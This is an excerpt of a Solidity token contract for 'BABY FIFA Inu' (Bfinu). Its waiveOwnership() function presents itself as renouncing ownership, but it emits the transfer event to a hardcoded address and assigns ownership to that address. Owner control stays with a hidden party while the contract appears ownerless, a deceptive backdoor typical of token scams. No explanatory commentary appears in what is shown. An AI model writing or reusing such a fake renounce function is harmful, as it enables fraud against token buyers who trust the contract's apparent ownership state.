...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xCf6B7Af7df8E52aA30Ec15B15dc7732134927df5));
        _owner = address(0xCf6B7Af7df8E52aA30Ec15B15dc7732134927df5);
    }
...
contract BabyFifaInu is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "BABY FIFA Inu";
    string private _symbol = "Bfinu";
